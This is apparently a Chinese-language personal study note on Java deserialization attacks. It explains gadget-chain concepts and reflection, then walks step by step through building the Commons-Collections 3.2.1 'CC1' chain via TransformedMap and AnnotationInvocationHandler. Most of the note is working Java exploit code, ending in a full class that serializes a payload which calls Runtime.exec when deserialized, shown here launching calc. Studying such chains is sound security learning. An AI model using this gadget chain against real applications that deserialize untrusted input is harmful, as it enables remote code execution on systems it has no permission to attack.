https://www.bilibili.com/video/BV16h411z7o9/?spm_id_from=333.788.video.desc.click

https://blog.csdn.net/mocas_wang/article/details/107621010?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165078230816782184615990%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=165078230816782184615990&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-107621010.nonecase&utm_term=%E5%BA%8F%E5%88%97%E5%8C%96&spm=1018.2226.3001.4450

1.继承接口```Serializable```的类才能序列化
2.带```transient```的Object的内容不会被序列化
3.可能的利用点：
	（1）入口类readObject（重写的）直接调用危险方法（一般不会有人在服务器这么写代码）
	（2）入口类参数中包含可控类，该类有危险方法，readObject时调用
	（3）入口类参数中包含可控类，该类有吊用其他危险方法的类，readObject时调用
	（4）构造函数/静态代码块等类加载时隐式执行（HashMap，HashTable）
共同点：
1.继承Serialzable
2.入口类source（重写readObject 参数类型宽泛，最好是jdk自带的）
	例：
	入口A HashCode
	目标类B URL
	目标调用B.f HashCode.hashcode()
	反序化后：
		A.readObject() HashCode.readObject()
		上面那个方法里有个```putVal(hash(key), key, value, false, false);```(并不是put函数中的那个，说调用链里有put的纯纯的误导)
		然后```hash(key)```下会调用```key.hashcode()```,而这时key就是B （URL），所以调用了```URL.hashcode()```

3.调用链gadget chain
执行类sink（rce ssrf 写文件等）

反射：
作用：让Java具有动态性
修改已有对象的属性
动态生成对象
动态调用方法
操作内部类私有方法

在反序化漏洞中的利用：
定制需要的对象
通过invoke调用出了同名函数以外的函数
通过Class类创建对象，引入不能序列化的类


URL的链
以key传入一个类，hashcode会调用key.hashCode，（相当于调用这个类的hashCode）



CommonsCollections

CC1

0.准备：

jdk版本：8u65(漏洞在8u71修复了)
maven：
commons-collections 3.2.1
```
    <dependencies>
        <dependency>
            <groupId>junit</groupId>
            <artifactId>junit</artifactId>
            <version>4.11</version>
            <scope>test</scope>
        </dependency>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.2.1</version>
        </dependency>
    </dependencies>
```
然后像sun这样的包是反编译出来的，所以无法做到下载注释和方法查询，所以必须自己下载（openjdk的同版本）https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/log?rev=annotationinvocationhandler
然后找对应版本：https://hg.openjdk.java.net/jdk8u/jdk8u/jdk/rev/af660750b2f4
下载zip解压，src/share/classes里面的sun文件，复制下来打开一开始的jdk文件，里面有个src.zip文件，解压，把sun复制进去，然后ideasdks加入刚刚解压的目录


org.apache.commons.collections.Transformer类
作用：接收一个对象，然后对接收的对象进行操作
ctrl + alt + b 查看实现类
可以看到各种实现类，然后可以看各种类的返回值

这里要用InvokerTransformer

方法值，参数类型，参数调用都是我们可以控制的
是个很标准的任意方法调用

1.寻找危险方法：
InvokerTransformer.transform
具体语句：
```new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r)```
```
package org.emample;

//import org.apache.commons.collections.Transformer;

import org.apache.commons.collections.functors.InvokerTransformer;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class CC1Test {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        //弹计算器
        //普通调用
        //Runtime.getRuntime().exec("calc");

        //反射调用
//        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r,"calc");

        //用Transformer的漏洞（参数就是InvokerTransformer的参数），然后调用transform()方法，从而实现利用
        Runtime r = Runtime.getRuntime();
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);
    }
}

```

然后我们本次的目的是：
找xxx.transform(p)的方法，xxx必须是可以随意赋值的，给它赋值```new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})```,然后p也必须是可以赋值的，赋值为```r```

2.找哪个方法里调用了transform方法
跟进transform方法，右键选择“查找用法”

直接忽略transform调用transform

找到```org.apache.commons.collections.map```
下面有DefaultedMap，LazyMap，TransformedMap都有get方法调用了transform

看TransformedMap类
```
    protected TransformedMap(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        super(map);
        this.keyTransformer = keyTransformer;
        this.valueTransformer = valueTransformer;
    }
```

被decorate调用
```
public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) {
        return new TransformedMap(map, keyTransformer, valueTransformer);
    }
```
这样就实现了自定义valueTransformer的内容

然后目标是调用checkSetValue：
```
    protected Object checkSetValue(Object value) {
        return valueTransformer.transform(value);
    }
```

查找用法发现只有一个调用点（AbstractInputCheckedMapDecorator.java下的MapEntry类，AbstractInputCheckedMapDecorator是TransformedMap的父类）：
```
        public Object setValue(Object value) {
            value = parent.checkSetValue(value);
            return entry.setValue(value);
        }
```

MapEntry的entry是用来遍历map的

如果主函数里使用了类似以下的遍历：
```
        for(Map.Entry entry:map.entrySet()){
            entry.setValue();
        }
```
setValue()是一个接口，说明可以重写
就会调用map下的setValue()，如果没有重写调用的就是Map这个类的，如果重写了，调用的就是重写后的，所以只用调用一开始传入自定义内容的map类，让其遍历，就能调用被重写的setValue()，进而调用checkSetValue
实现弹计算器
这就证明这条链是可以用的
```
 Runtime r = Runtime.getRuntime();
        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
        HashMap<Object, Object> map = new HashMap<>();
        map.put("key","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);

        for(Map.Entry entry:transformedMap.entrySet()) {
            entry.setValue(r);//输入要运行的方法
        }
```


这里证明：如果主函数有遍历map的地方，而且调用了setValue，那么就可以使用这个方法


3.然后找setValue()被哪里调用（查找用法）
（必须做导入openjdk的sun这一步）
sun.reflect.annotation下的AnnotationInvocationHandler.java的readObject会调用memberValue.setValue的方法
```
    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException {
        s.defaultReadObject();

        // Check to make sure that types have not evolved incompatibly

        AnnotationType annotationType = null;
        try {
            annotationType = AnnotationType.getInstance(type);
        } catch(IllegalArgumentException e) {
            // Class is no longer an annotation type; time to punch out
            throw new java.io.InvalidObjectException("Non-annotation type in annotation serial stream");
        }

        Map<String, Class<?>> memberTypes = annotationType.memberTypes();

        // If there are annotation members without values, that
        // situation is handled by the invoke method.
        for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
            String name = memberValue.getKey();
            Class<?> memberType = memberTypes.get(name);
            if (memberType != null) {  // i.e. member still exists
                Object value = memberValue.getValue();
                if (!(memberType.isInstance(value) ||
                      value instanceof ExceptionProxy)) {
                    memberValue.setValue(
                        new AnnotationTypeMismatchExceptionProxy(
                            value.getClass() + "[" + value + "]").setMember(
                                annotationType.members().get(name)));
                }
            }
        }
    }
```

只要提前构造memberValues的值就行

然后看构造函数：
```
    AnnotationInvocationHandler(Class<? extends Annotation> type, Map<String, Object> memberValues) {
        Class<?>[] superInterfaces = type.getInterfaces();
        if (!type.isAnnotation() ||
            superInterfaces.length != 1 ||
            superInterfaces[0] != java.lang.annotation.Annotation.class)
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        this.type = type;
        this.memberValues = memberValues;
    }
```

发现真的能自定义memberValues的值

然后实例化这个类，尝试调用它

不是public类型，只能在这个包底下才能获取，无法直接获取，必须反射获取
```
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
        anno.setAccessible(true);//设置权限，可以访问
        Object o = anno.newInstance(Override.class, transformedMap);//实例化
```

然后在后面加以前写好的序列化，反序化函数
```
public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
```

这里还有三个问题：
（1）```Runtime.getRuntime()```没法序列化，需要反射
（2）sun.reflect.annotation的AnnotationInvocationHandler.java的447行有```if (memberType != null)```判断，可能没运行到```memberValue.setValue```方法
（3）```chainedTransformer.transform(Runtime.class);```这句是无法使用的，必须加进反序化里


（1）```Runtime.getRuntime()```没法序列化，需要反射
```Runtime.class```可以序列化

构建使用方法：
```
        Class c= Runtime.class;
        Method getRuntimeMethod = c.getMethod("getRuntime", null);//null代表是一个无参方法
        Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);//反射调用，第一个null意味是一个静态方法，第二个意味着无参
        Method execMethod = c.getMethod("exec", String.class);
        execMethod.invoke(r,"calc");//反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数
```

逐条转换，套用到InvokerTransformer方法中

```
Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);//作用为c.getMethod("getRuntime", null);
        //其中的String.class, Class[].class是getMethod的参数类型getRuntime, null是参数,最后用Runtime.class调用（相当于那个c）
        Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);//相当于Method execMethod = c.getMethod("exec", String.class);
        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);//相当于Method execMethod = c.getMethod("exec", String.class);execMethod.invoke(r,"calc");
        // 反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数
```

简化：
```
        Transformer[] transformers = {
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        chainedTransformer.transform(Runtime.class);//调最初的那个参数
```

加入到反序化：
```
Transformer[] transformers = {
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);//调最初的那个参数



        HashMap<Object, Object> map = new HashMap<>();
        map.put("key","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
        anno.setAccessible(true);//设置权限，可以访问
        Object o = anno.newInstance(Override.class, transformedMap);//实例化
        serialize(o);//序列化
        unserialize("ser.bin");//反序化
```
运行发现没有用，因为还有两个问题

（2）sun.reflect.annotation的AnnotationInvocationHandler.java的447行有```if (memberType != null)```判断，可能没运行到```memberValue.setValue```方法

因为```Override.class```这个注解没有成员变量，所以判断那里是null（前面获取key就是获取成员变量），所以要换一个有成员变量的注解方法```Target.class```
然后改这里```map.put("value","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value```

然后就成功进入了
```
        Transformer[] transformers = {
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        //chainedTransformer.transform(Runtime.class);//调最初的那个参数



        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
        anno.setAccessible(true);//设置权限，可以访问
        Object o = anno.newInstance(Target.class, transformedMap);//实例化(为了判断不为null，所以第一个参数所对应的注解要有成员变量，所以用Target.class）
        serialize(o);//序列化
        unserialize("ser.bin");//反序化
```


（3）```chainedTransformer.transform(Runtime.class);```这句是无法使用的，必须加进反序化里

解决方法，ConstantTransformer方法，它里面的transform唯一的作用就是返回ConstantTransformer方法的参数
最后就成功执行了
```
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };


        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);



        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
        anno.setAccessible(true);//设置权限，可以访问
        Object o = anno.newInstance(Target.class, transformedMap);//实例化(为了判断不为null，所以第一个参数所对应的注解要有成员变量，所以用Target.class）
        serialize(o);//序列化
        unserialize("ser.bin");//反序化
```

整个过程
```
package org.emample;

//import org.apache.commons.collections.Transformer;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.HashMap;
import java.util.Map;

public class CC1Test {
    public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
        //弹计算器
        //普通调用
        //Runtime.getRuntime().exec("calc");
        //---------------------------

        //反射调用
//        Runtime r = Runtime.getRuntime();
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r,"calc");

        //---------------------------

        //用Transformer的漏洞（参数就是InvokerTransformer的参数），然后调用transform()方法，从而实现利用
        //Runtime r = Runtime.getRuntime();
        //new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"}).transform(r);
        //---------------------------

//        Runtime r = Runtime.getRuntime();
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("key","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行
//
//        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);

//        for(Map.Entry entry:transformedMap.entrySet()) {
//            entry.setValue(r);//输入要运行的方法
//        }

        //---------------------------

        //Runtime r = Runtime.getRuntime();

//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
//        HashMap<Object, Object> map = new HashMap<>();
//        map.put("key","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行
//
//        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,invokerTransformer);
//
//        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
//        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
//        anno.setAccessible(true);//设置权限，可以访问
//        Object o = anno.newInstance(Override.class, transformedMap);//实例化
//        serialize(o);//序列化
//        unserialize("ser.bin");//反序化

        //---------------------------




        //Class c= Runtime.class;
        //Method getRuntimeMethod = c.getMethod("getRuntime", null);//null代表是一个无参方法
        //Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);//反射调用，第一个null意味是一个静态方法，第二个意味着无参
        //Method execMethod = c.getMethod("exec", String.class);
        //execMethod.invoke(r,"calc");//反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数

        //---------------------------
        //逐条转换，套用到InvokerTransformer方法中
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);//作用为c.getMethod("getRuntime", null);
//        //其中的String.class, Class[].class是getMethod的参数类型getRuntime, null是参数,最后用Runtime.class调用（相当于那个c）
//        Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);//相当于Method execMethod = c.getMethod("exec", String.class);
//        new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"}).transform(r);//相当于Method execMethod = c.getMethod("exec", String.class);execMethod.invoke(r,"calc");
        // 反射调用，第一个参数意味着在r的基础上调用exec（r.exec()),第二个参数意味着参数

        //---------------------------

        //简化
//        Transformer[] transformers = {
//                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
//                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
//                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{"calc"})
//        };
//
//        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);//调最初的那个参数

        //---------------------------

        //加入到反序化

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };


        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);



        HashMap<Object, Object> map = new HashMap<>();
        map.put("value","aaa");//这一步的目的是保证map里面有东西，不然for循环不会运行//与Target.class对应，为了防止那处的判断为null，key为Target.class的成员变量value

        Map<Object,Object> transformedMap = TransformedMap.decorate(map,null,chainedTransformer);

        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> anno = c.getDeclaredConstructor(Class.class, Map.class);//这里的参数就是构造函数的参数类型
        anno.setAccessible(true);//设置权限，可以访问
        Object o = anno.newInstance(Target.class, transformedMap);//实例化(为了判断不为null，所以第一个参数所对应的注解要有成员变量，所以用Target.class）
        serialize(o);//序列化
        unserialize("ser.bin");//反序化


    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
        Object obj = ois.readObject();
        return obj;
    }
}
```

还有一条链（国外的）没有用```transformedMap```，用的```lazyMap```（更复杂），有时间去分析一下
https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/CommonsCollections1.java


ysoserial工具：https://github.com/frohoff/ysoserial